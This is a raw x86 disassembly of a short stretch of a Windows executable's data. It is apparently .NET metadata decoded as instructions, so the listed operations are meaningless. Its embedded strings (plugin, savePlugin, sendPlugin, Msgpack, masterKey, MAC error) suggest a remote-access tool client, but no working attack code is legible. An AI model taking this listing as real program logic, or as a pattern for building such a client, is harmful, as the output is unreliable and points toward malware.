  40bbcc:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bbd0:	00 63 00             	add    %ah,0x0(%ebx)
  40bbd3:	74 00                	je     0x40bbd5
  40bbd5:	00 17                	add    %dl,(%edi)
  40bbd7:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bbdb:	73 00                	jae    0x40bbdd
  40bbdd:	70 00                	jo     0x40bbdf
  40bbdf:	6c                   	insb   (%dx),%es:(%edi)
  40bbe0:	00 61 00             	add    %ah,0x0(%ecx)
  40bbe3:	79 00                	jns    0x40bbe5
  40bbe5:	4e                   	dec    %esi
  40bbe6:	00 61 00             	add    %ah,0x0(%ecx)
  40bbe9:	6d                   	insl   (%dx),%es:(%edi)
  40bbea:	00 65 00             	add    %ah,0x0(%ebp)
  40bbed:	00 07                	add    %al,(%edi)
  40bbef:	4e                   	dec    %esi
  40bbf0:	00 2f                	add    %ch,(%edi)
  40bbf2:	00 41 00             	add    %al,0x0(%ecx)
  40bbf5:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bbfb:	00 13                	add    %dl,(%ebx)
  40bbfd:	53                   	push   %ebx
  40bbfe:	00 6f 00             	add    %ch,0x0(%edi)
  40bc01:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bc06:	00 61 00             	add    %ah,0x0(%ecx)
  40bc09:	72 00                	jb     0x40bc0b
  40bc0b:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bc10:	09 70 00             	or     %esi,0x0(%eax)
  40bc13:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc14:	00 6e 00             	add    %ch,0x0(%esi)
  40bc17:	67 00 00             	add    %al,(%bx,%si)
  40bc1a:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bc1f:	75 00                	jne    0x40bc21
  40bc21:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bc25:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc26:	00 00                	add    %al,(%eax)
  40bc28:	15 73 00 61 00       	adc    $0x610073,%eax
  40bc2d:	76 00                	jbe    0x40bc2f
  40bc2f:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40bc33:	6c                   	insb   (%dx),%es:(%edi)
  40bc34:	00 75 00             	add    %dh,0x0(%ebp)
  40bc37:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bc3b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc3c:	00 00                	add    %al,(%eax)
  40bc3e:	07                   	pop    %es
  40bc3f:	44                   	inc    %esp
  40bc40:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bc44:	00 00                	add    %al,(%eax)
  40bc46:	15 73 00 65 00       	adc    $0x650073,%eax
  40bc4b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc4c:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40bc50:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc54:	00 67 00             	add    %ah,0x0(%edi)
  40bc57:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40bc5d:	48                   	dec    %eax
  40bc5e:	00 61 00             	add    %ah,0x0(%ecx)
  40bc61:	73 00                	jae    0x40bc63
  40bc63:	68 00 65 00 73       	push   $0x73006500
  40bc68:	00 00                	add    %al,(%eax)
  40bc6a:	09 48 00             	or     %ecx,0x0(%eax)
  40bc6d:	61                   	popa
  40bc6e:	00 73 00             	add    %dh,0x0(%ebx)
  40bc71:	68 00 00 1b 50       	push   $0x501b0000
  40bc76:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc7a:	00 67 00             	add    %ah,0x0(%edi)
  40bc7d:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40bc83:	50                   	push   %eax
  40bc84:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc88:	00 67 00             	add    %ah,0x0(%edi)
  40bc8b:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40bc91:	52                   	push   %edx
  40bc92:	00 75 00             	add    %dh,0x0(%ebp)
  40bc95:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc96:	00 00                	add    %al,(%eax)
  40bc98:	0f 4d 00             	cmovge (%eax),%eax
  40bc9b:	73 00                	jae    0x40bc9d
  40bc9d:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bca1:	61                   	popa
  40bca2:	00 63 00             	add    %ah,0x0(%ebx)
  40bca5:	6b 00 00             	imul   $0x0,(%eax),%eax
  40bca8:	11 52 00             	adc    %edx,0x0(%edx)
  40bcab:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bcaf:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bcb3:	76 00                	jbe    0x40bcb5
  40bcb5:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40bcba:	0b 45 00             	or     0x0(%ebp),%eax
  40bcbd:	72 00                	jb     0x40bcbf
  40bcbf:	72 00                	jb     0x40bcc1
  40bcc1:	6f                   	outsl  %ds:(%esi),(%dx)
  40bcc2:	00 72 00             	add    %dh,0x0(%edx)
  40bcc5:	00 47 6d             	add    %al,0x6d(%edi)
  40bcc8:	00 61 00             	add    %ah,0x0(%ecx)
  40bccb:	73 00                	jae    0x40bccd
  40bccd:	74 00                	je     0x40bccf
  40bccf:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bcd3:	4b                   	dec    %ebx
  40bcd4:	00 65 00             	add    %ah,0x0(%ebp)
  40bcd7:	79 00                	jns    0x40bcd9
  40bcd9:	20 00                	and    %al,(%eax)
  40bcdb:	63 00                	arpl   %eax,(%eax)
  40bcdd:	61                   	popa
  40bcde:	00 6e 00             	add    %ch,0x0(%esi)
  40bce1:	20 00                	and    %al,(%eax)
  40bce3:	6e                   	outsb  %ds:(%esi),(%dx)
  40bce4:	00 6f 00             	add    %ch,0x0(%edi)
  40bce7:	74 00                	je     0x40bce9
  40bce9:	20 00                	and    %al,(%eax)
  40bceb:	62 00                	bound  %eax,(%eax)
  40bced:	65 00 20             	add    %ah,%gs:(%eax)
  40bcf0:	00 6e 00             	add    %ch,0x0(%esi)
  40bcf3:	75 00                	jne    0x40bcf5
  40bcf5:	6c                   	insb   (%dx),%es:(%edi)
  40bcf6:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40bcfa:	00 6f 00             	add    %ch,0x0(%edi)
  40bcfd:	72 00                	jb     0x40bcff
  40bcff:	20 00                	and    %al,(%eax)
  40bd01:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bd05:	70 00                	jo     0x40bd07
  40bd07:	74 00                	je     0x40bd09
  40bd09:	79 00                	jns    0x40bd0b
  40bd0b:	2e 00 00             	add    %al,%cs:(%eax)
  40bd0e:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bd13:	70 00                	jo     0x40bd15
  40bd15:	75 00                	jne    0x40bd17
  40bd17:	74 00                	je     0x40bd19
  40bd19:	20 00                	and    %al,(%eax)
  40bd1b:	63 00                	arpl   %eax,(%eax)
  40bd1d:	61                   	popa
  40bd1e:	00 6e 00             	add    %ch,0x0(%esi)
  40bd21:	20 00                	and    %al,(%eax)
  40bd23:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd24:	00 6f 00             	add    %ch,0x0(%edi)
  40bd27:	74 00                	je     0x40bd29
  40bd29:	20 00                	and    %al,(%eax)
  40bd2b:	62 00                	bound  %eax,(%eax)
  40bd2d:	65 00 20             	add    %ah,%gs:(%eax)
  40bd30:	00 6e 00             	add    %ch,0x0(%esi)
  40bd33:	75 00                	jne    0x40bd35
  40bd35:	6c                   	insb   (%dx),%es:(%edi)
  40bd36:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bd3a:	00 00                	add    %al,(%eax)
  40bd3c:	55                   	push   %ebp
  40bd3d:	49                   	dec    %ecx
  40bd3e:	00 6e 00             	add    %ch,0x0(%esi)
  40bd41:	76 00                	jbe    0x40bd43
  40bd43:	61                   	popa
  40bd44:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bd48:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bd4c:	00 6d 00             	add    %ch,0x0(%ebp)
  40bd4f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bd53:	73 00                	jae    0x40bd55
  40bd55:	61                   	popa
  40bd56:	00 67 00             	add    %ah,0x0(%edi)
  40bd59:	65 00 20             	add    %ah,%gs:(%eax)
  40bd5c:	00 61 00             	add    %ah,0x0(%ecx)
  40bd5f:	75 00                	jne    0x40bd61
  40bd61:	74 00                	je     0x40bd63
  40bd63:	68 00 65 00 6e       	push   $0x6e006500
  40bd68:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bd6c:	00 63 00             	add    %ah,0x0(%ebx)
  40bd6f:	61                   	popa
  40bd70:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bd74:	00 6f 00             	add    %ch,0x0(%edi)
  40bd77:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd78:	00 20                	add    %ah,(%eax)
  40bd7a:	00 63 00             	add    %ah,0x0(%ebx)
  40bd7d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd7e:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bd82:	00 20                	add    %ah,(%eax)
  40bd84:	00 28                	add    %ch,(%eax)
  40bd86:	00 4d 00             	add    %cl,0x0(%ebp)
  40bd89:	41                   	inc    %ecx
  40bd8a:	00 43 00             	add    %al,0x0(%ebx)
  40bd8d:	29 00                	sub    %eax,(%eax)
  40bd8f:	2e 00 00             	add    %al,%cs:(%eax)
  40bd92:	05 58 00 32 00       	add    $0x320058,%eax
  40bd97:	00 0f                	add    %cl,(%edi)
  40bd99:	7b 00                	jnp    0x40bd9b
  40bd9b:	30 00                	xor    %al,(%eax)
  40bd9d:	3a 00                	cmp    (%eax),%al
  40bd9f:	44                   	inc    %esp
  40bda0:	00 33                	add    %dh,(%ebx)
  40bda2:	00 7d 00             	add    %bh,0x0(%ebp)
  40bda5:	20 00                	and    %al,(%eax)
  40bda7:	00 0f                	add    %cl,(%edi)
  40bda9:	7b 00                	jnp    0x40bdab
  40bdab:	30 00                	xor    %al,(%eax)
  40bdad:	3a 00                	cmp    (%eax),%al
  40bdaf:	58                   	pop    %eax
  40bdb0:	00 32                	add    %dh,(%edx)
  40bdb2:	00 7d 00             	add    %bh,0x0(%ebp)
  40bdb5:	20 00                	and    %al,(%eax)
  40bdb7:	00 2b                	add    %ch,(%ebx)
  40bdb9:	28 00                	sub    %al,(%eax)
  40bdbb:	6e                   	outsb  %ds:(%esi),(%dx)
  40bdbc:	00 65 00             	add    %ah,0x0(%ebp)
  40bdbf:	76 00                	jbe    0x40bdc1
  40bdc1:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bdc5:	20 00                	and    %al,(%eax)
  40bdc7:	75 00                	jne    0x40bdc9
  40bdc9:	73 00                	jae    0x40bdcb
  40bdcb:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bdd0:	00 20                	add    %ah,(%eax)
  40bdd2:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bdd6:	00 70 00             	add    %dh,0x0(%eax)
  40bdd9:	65 00 20             	add    %ah,%gs:(%eax)
  40bddc:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bddf:	63 00                	arpl   %eax,(%eax)
  40bde1:	31 00                	xor    %eax,(%eax)
  40bde3:	00 45 28             	add    %al,0x28(%ebp)
  40bde6:	00 65 00             	add    %ah,0x0(%ebp)
  40bde9:	78 00                	js     0x40bdeb
  40bdeb:	74 00                	je     0x40bded
  40bded:	38 00                	cmp    %al,(%eax)
  40bdef:	2c 00                	sub    $0x0,%al
  40bdf1:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bdf5:	74 00                	je     0x40bdf7
  40bdf7:	31 00                	xor    %eax,(%eax)
  40bdf9:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bdfd:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40be01:	33 00                	xor    (%eax),%eax
  40be03:	32 00                	xor    (%eax),%al
  40be05:	29 00                	sub    %eax,(%eax)
  40be07:	20 00                	and    %al,(%eax)
  40be09:	74 00                	je     0x40be0b
  40be0b:	79 00                	jns    0x40be0d
  40be0d:	70 00                	jo     0x40be0f
  40be0f:	65 00 20             	add    %ah,%gs:(%eax)
  40be12:	00 24 00             	add    %ah,(%eax,%eax,1)
  40be15:	63 00                	arpl   %eax,(%eax)
  40be17:	37                   	aaa
  40be18:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40be1b:	24 00                	and    $0x0,%al
  40be1d:	63 00                	arpl   %eax,(%eax)
  40be1f:	38 00                	cmp    %al,(%eax)
  40be21:	2c 00                	sub    $0x0,%al
  40be23:	24 00                	and    $0x0,%al
  40be25:	63 00                	arpl   %eax,(%eax)
  40be27:	39 00                	cmp    %eax,(%eax)
  40be29:	00 00                	add    %al,(%eax)
  40be2b:	00 14 74             	add    %dl,(%esp,%esi,2)
  40be2e:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40be32:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40be35:	24 f5                	and    $0xf5,%al
  40be37:	ac                   	lods   %ds:(%esi),%al
  40be38:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40be3f:	7a 5c                	jp     0x40be9d
  40be41:	56                   	push   %esi
  40be42:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40be45:	89 03                	mov    %eax,(%ebx)
  40be47:	00 00                	add    %al,(%eax)
  40be49:	01 03                	add    %eax,(%ebx)
  40be4b:	20 00                	and    %al,(%eax)
  40be4d:	01 02                	add    %eax,(%edx)
  40be4f:	06                   	push   %es
  40be50:	0e                   	push   %cs
  40be51:	03 06                	add    (%esi),%eax
  40be53:	12 09                	adc    (%ecx),%cl
  40be55:	03 06                	add    (%esi),%eax
  40be57:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40be5b:	00 02                	add    %al,(%edx)
  40be5d:	03 06                	add    (%esi),%eax
  40be5f:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40be65:	03 06                	add    (%esi),%eax
  40be67:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40be6c:	03 06                	add    (%esi),%eax
  40be6e:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40be74:	06                   	push   %es
  40be75:	1c 02                	sbb    $0x2,%al
  40be77:	06                   	push   %es
  40be78:	08 04 00             	or     %al,(%eax,%eax,1)
  40be7b:	00 12                	add    %dl,(%edx)
  40be7d:	0d 05 00 01 01       	or     $0x1010005,%eax
  40be82:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40be88:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40be8e:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40be91:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40be97:	01 1d 05 03 00 00    	add    %ebx,0x305
  40be9d:	0a 04 00             	or     (%eax,%eax,1),%al
  40bea0:	01 01                	add    %eax,(%ecx)
  40bea2:	0a 04 00             	or     (%eax,%eax,1),%al
  40bea5:	00 12                	add    %dl,(%edx)
  40bea7:	15 05 00 01 01       	adc    $0x1010005,%eax
  40beac:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40beb2:	02 03                	add    (%ebx),%al
  40beb4:	00 00                	add    %al,(%eax)
  40beb6:	1c 03                	sbb    $0x3,%al
  40beb8:	00 00                	add    %al,(%eax)
  40beba:	08 04 00             	or     %al,(%eax,%eax,1)
  40bebd:	01 01                	add    %eax,(%ecx)
  40bebf:	08 04 00             	or     %al,(%eax,%eax,1)
  40bec2:	01 02                	add    %eax,(%edx)
  40bec4:	0e                   	push   %cs
  40bec5:	0a 00                	or     (%eax),%al
  40bec7:	04 02                	add    $0x2,%al
  40bec9:	1c 12                	sbb    $0x12,%al
  40becb:	19 12                	sbb    %edx,(%edx)
  40becd:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40bed2:	01 01                	add    %eax,(%ecx)
  40bed4:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40beda:	1c 04                	sbb    $0x4,%al
  40bedc:	08 00                	or     %al,(%eax)
  40bede:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40bee4:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40bee7:	00 1d 05 03 08 00    	add    %bl,0x80305
  40beed:	0a 04 08             	or     (%eax,%ecx,1),%al
  40bef0:	00 12                	add    %dl,(%edx)
  40bef2:	15 03 08 00 02       	adc    $0x2000803,%eax
  40bef7:	03 08                	add    (%eax),%ecx
  40bef9:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40befc:	08 00                	or     %al,(%eax)
  40befe:	08 03                	or     %al,(%ebx)
  40bf00:	00 00                	add    %al,(%eax)
  40bf02:	0e                   	push   %cs
  40bf03:	04 00                	add    $0x0,%al
  40bf05:	01 0e                	add    %ecx,(%esi)
  40bf07:	0e                   	push   %cs
  40bf08:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40bf0e:	d5 0a                	aad    $0xa
  40bf10:	3a 06                	cmp    (%esi),%al
  40bf12:	00 01                	add    %al,(%ecx)
  40bf14:	12 29                	adc    (%ecx),%ch
  40bf16:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40bf1c:	03 00                	add    (%eax),%eax
  40bf1e:	00 18                	add    %bl,(%eax)
  40bf20:	07                   	pop    %es
  40bf21:	00 03                	add    %al,(%ebx)
  40bf23:	08 18                	or     %bl,(%eax)
  40bf25:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40bf2b:	18 0e                	sbb    %cl,(%esi)
  40bf2d:	06                   	push   %es
  40bf2e:	00 02                	add    %al,(%edx)
  40bf30:	02 18                	add    (%eax),%bl
  40bf32:	10 02                	adc    %al,(%edx)
  40bf34:	06                   	push   %es
  40bf35:	00 01                	add    %al,(%ecx)
  40bf37:	11 30                	adc    %esi,(%eax)
  40bf39:	11 30                	adc    %esi,(%eax)
  40bf3b:	06                   	push   %es
  40bf3c:	00 03                	add    %al,(%ebx)
  40bf3e:	01 09                	add    %ecx,(%ecx)
  40bf40:	09 09                	or     %ecx,(%ecx)
  40bf42:	02 06                	add    (%esi),%al
  40bf44:	09 03                	or     %eax,(%ebx)
  40bf46:	06                   	push   %es
  40bf47:	11 30                	adc    %esi,(%eax)
  40bf49:	04 00                	add    $0x0,%al
  40bf4b:	00 00                	add    %al,(%eax)
  40bf4d:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40bf51:	00 00                	add    %al,(%eax)
  40bf53:	04 01                	add    $0x1,%al
  40bf55:	00 00                	add    %al,(%eax)
  40bf57:	00 06                	add    %al,(%esi)
  40bf59:	00 02                	add    %al,(%edx)
  40bf5b:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40bf5e:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40bf63:	0e                   	push   %cs
  40bf64:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf69:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40bf6e:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf73:	60                   	pusha
  40bf74:	05 00 01 01 12       	add    $0x12010100,%eax
  40bf79:	60                   	pusha
  40bf7a:	04 00                	add    $0x0,%al
  40bf7c:	01 01                	add    %eax,(%ecx)
  40bf7e:	0e                   	push   %cs
  40bf7f:	18 06                	sbb    %al,(%esi)
  40bf81:	15 12 45 01 15       	adc    $0x15014512,%eax
  40bf86:	12 49 0a             	adc    0xa(%ecx),%cl
  40bf89:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40bf8c:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40bf92:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40bf97:	0e                   	push   %cs
  40bf98:	04 20                	add    $0x20,%al
  40bf9a:	00 00                	add    %al,(%eax)
  40bf9c:	00 04 40             	add    %al,(%eax,%eax,2)
  40bf9f:	00 00                	add    %al,(%eax)
  40bfa1:	00 04 10             	add    %al,(%eax,%edx,1)
  40bfa4:	00 00                	add    %al,(%eax)
  40bfa6:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bfa9:	01 01                	add    %eax,(%ecx)
  40bfab:	0e                   	push   %cs
  40bfac:	04 20                	add    $0x20,%al
  40bfae:	01 0e                	add    %ecx,(%esi)
  40bfb0:	0e                   	push   %cs
  40bfb1:	06                   	push   %es
  40bfb2:	20 01                	and    %al,(%ecx)
  40bfb4:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bfb9:	20 02                	and    %al,(%edx)
  40bfbb:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40bfc1:	00 01                	add    %al,(%ecx)
  40bfc3:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40bfc8:	06                   	push   %es
  40bfc9:	11 50 03             	adc    %edx,0x3(%eax)
  40bfcc:	06                   	push   %es
  40bfcd:	12 55 05             	adc    0x5(%ebp),%dl
  40bfd0:	00 01                	add    %al,(%ecx)
  40bfd2:	0e                   	push   %cs
  40bfd3:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bfd8:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40bfdd:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40bfe3:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40bfe9:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40bfef:	01 01                	add    %eax,(%ecx)
  40bff1:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bff6:	60                   	pusha
  40bff7:	03 20                	add    (%eax),%esp
  40bff9:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bffc:	20 00                	and    %al,(%eax)
  40bffe:	02 03                	add    (%ebx),%al
  40c000:	28 00                	sub    %al,(%eax)
  40c002:	1c 03                	sbb    $0x3,%al
  40c004:	06                   	push   %es
  40c005:	12 60 0b             	adc    0xb(%eax),%ah
  40c008:	20 02                	and    %al,(%edx)
  40c00a:	01 12                	add    %edx,(%edx)
  40c00c:	60                   	pusha
  40c00d:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c012:	60                   	pusha
  40c013:	04 20                	add    $0x20,%al
  40c015:	00 12                	add    %dl,(%edx)
  40c017:	60                   	pusha
  40c018:	05 20 01 12 60       	add    $0x60120120,%eax
  40c01d:	0e                   	push   %cs
  40c01e:	05 20 01 12 60       	add    $0x60120120,%eax
  40c023:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c029:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c02e:	60                   	pusha
  40c02f:	08 03                	or     %al,(%ebx)
  40c031:	20 00                	and    %al,(%eax)
  40c033:	08 05 28 01 12 60    	or     %al,0x60120128
  40c039:	08 03                	or     %al,(%ebx)
  40c03b:	28 00                	sub    %al,(%eax)
  40c03d:	08 03                	or     %al,(%ebx)
  40c03f:	06                   	push   %es
  40c040:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40c044:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c048:	01 08                	add    %ecx,(%eax)
  40c04a:	0e                   	push   %cs
  40c04b:	05 20 01 01 12       	add    $0x12010120,%eax
  40c050:	61                   	popa
  40c051:	04 20                	add    $0x20,%al
  40c053:	01 01                	add    %eax,(%ecx)
  40c055:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c058:	01 01                	add    %eax,(%ecx)
  40c05a:	0b 03                	or     (%ebx),%eax
  40c05c:	20 00                	and    %al,(%eax)
  40c05e:	0b 03                	or     (%ebx),%eax
  40c060:	20 00                	and    %al,(%eax)
  40c062:	0a 03                	or     (%ebx),%al
  40c064:	20 00                	and    %al,(%eax)
  40c066:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c06b:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c070:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c075:	01 0e                	add    %ecx,(%esi)
  40c077:	0e                   	push   %cs
  40c078:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c07d:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c080:	01 02                	add    %eax,(%edx)
  40c082:	0e                   	push   %cs
  40c083:	03 20                	add    (%eax),%esp
  40c085:	00 0e                	add    %cl,(%esi)
  40c087:	04 20                	add    $0x20,%al
  40c089:	01 01                	add    %eax,(%ecx)
  40c08b:	02 04 20             	add    (%eax,%eiz,1),%al
  40c08e:	01 01                	add    %eax,(%ecx)
  40c090:	0c 04                	or     $0x4,%al
  40c092:	20 01                	and    %al,(%ecx)
  40c094:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c09a:	5c                   	pop    %esp
  40c09b:	04 20                	add    $0x20,%al
  40c09d:	00 11                	add    %dl,(%ecx)
  40c09f:	64 04 20             	fs add $0x20,%al
  40c0a2:	00 12                	add    %dl,(%edx)
  40c0a4:	59                   	pop    %ecx
  40c0a5:	03 28                	add    (%eax),%ebp
  40c0a7:	00 0e                	add    %cl,(%esi)
  40c0a9:	03 28                	add    (%eax),%ebp
  40c0ab:	00 0a                	add    %cl,(%edx)
  40c0ad:	03 28                	add    (%eax),%ebp
  40c0af:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c0b5:	5c                   	pop    %esp
  40c0b6:	04 28                	add    $0x28,%al
  40c0b8:	00 11                	add    %dl,(%ecx)
  40c0ba:	64 04 00             	fs add $0x0,%al
  40c0bd:	00 00                	add    %al,(%eax)
  40c0bf:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c0c2:	00 00                	add    %al,(%eax)
  40c0c4:	00 04 04             	add    %al,(%esp,%eax,1)
  40c0c7:	00 00                	add    %al,(%eax)
  40c0c9:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c0d0:	06                   	push   %es
  40c0d1:	00 00                	add    %al,(%eax)
  40c0d3:	00 04 07             	add    %al,(%edi,%eax,1)
  40c0d6:	00 00                	add    %al,(%eax)
  40c0d8:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c0db:	00 00                	add    %al,(%eax)
  40c0dd:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c0e0:	00 00                	add    %al,(%eax)
  40c0e2:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c0e5:	00 00                	add    %al,(%eax)
  40c0e7:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c0ea:	00 00                	add    %al,(%eax)
  40c0ec:	00 06                	add    %al,(%esi)
  40c0ee:	00 02                	add    %al,(%edx)
  40c0f0:	0e                   	push   %cs
  40c0f1:	12 61 08             	adc    0x8(%ecx),%ah
  40c0f4:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c0f9:	61                   	popa
  40c0fa:	06                   	push   %es
  40c0fb:	00 02                	add    %al,(%edx)
  40c0fd:	0e                   	push   %cs
  40c0fe:	05 12 61 05 00       	add    $0x56112,%eax
  40c103:	01 01                	add    %eax,(%ecx)
  40c105:	12 61 06             	adc    0x6(%ecx),%ah
  40c108:	00 02                	add    %al,(%edx)
  40c10a:	01 12                	add    %edx,(%edx)
  40c10c:	61                   	popa
  40c10d:	0e                   	push   %cs
  40c10e:	07                   	pop    %es
  40c10f:	00 02                	add    %al,(%edx)
  40c111:	01 12                	add    %edx,(%edx)
  40c113:	61                   	popa
  40c114:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c119:	01 12                	add    %edx,(%edx)
  40c11b:	61                   	popa
  40c11c:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c121:	12 61 0c             	adc    0xc(%ecx),%ah
  40c124:	06                   	push   %es
  40c125:	00 02                	add    %al,(%edx)
  40c127:	01 12                	add    %edx,(%edx)
  40c129:	61                   	popa
  40c12a:	02 06                	add    (%esi),%al
  40c12c:	00 02                	add    %al,(%edx)
  40c12e:	01 12                	add    %edx,(%edx)
  40c130:	61                   	popa
  40c131:	0b 06                	or     (%esi),%eax
  40c133:	00 02                	add    %al,(%edx)
  40c135:	01 12                	add    %edx,(%edx)
  40c137:	61                   	popa
  40c138:	0a 03                	or     (%ebx),%al
  40c13a:	06                   	push   %es
  40c13b:	11 78 04             	adc    %edi,0x4(%eax)
  40c13e:	20 01                	and    %al,(%ecx)
  40c140:	01 08                	add    %ecx,(%eax)
  40c142:	08 01                	or     %al,(%ecx)
  40c144:	00 08                	add    %cl,(%eax)
  40c146:	00 00                	add    %al,(%eax)
  40c148:	00 00                	add    %al,(%eax)
  40c14a:	00 1e                	add    %bl,(%esi)
  40c14c:	01 00                	add    %eax,(%eax)
  40c14e:	01 00                	add    %eax,(%eax)
  40c150:	54                   	push   %esp
  40c151:	02 16                	add    (%esi),%dl
  40c153:	57                   	push   %edi
  40c154:	72 61                	jb     0x40c1b7
  40c156:	70 4e                	jo     0x40c1a6
  40c158:	6f                   	outsl  %ds:(%esi),(%dx)
  40c159:	6e                   	outsb  %ds:(%esi),(%dx)
  40c15a:	45                   	inc    %ebp
  40c15b:	78 63                	js     0x40c1c0
  40c15d:	65 70 74             	gs jo  0x40c1d4
  40c160:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c167:	77 73                	ja     0x40c1dc
  40c169:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c16f:	71 08                	jno    0x40c179
  40c171:	01 00                	add    %eax,(%eax)
  40c173:	02 00                	add    (%eax),%al
  40c175:	00 00                	add    %al,(%eax)
  40c177:	00 00                	add    %al,(%eax)
  40c179:	05 01 00 00 00       	add    $0x1,%eax
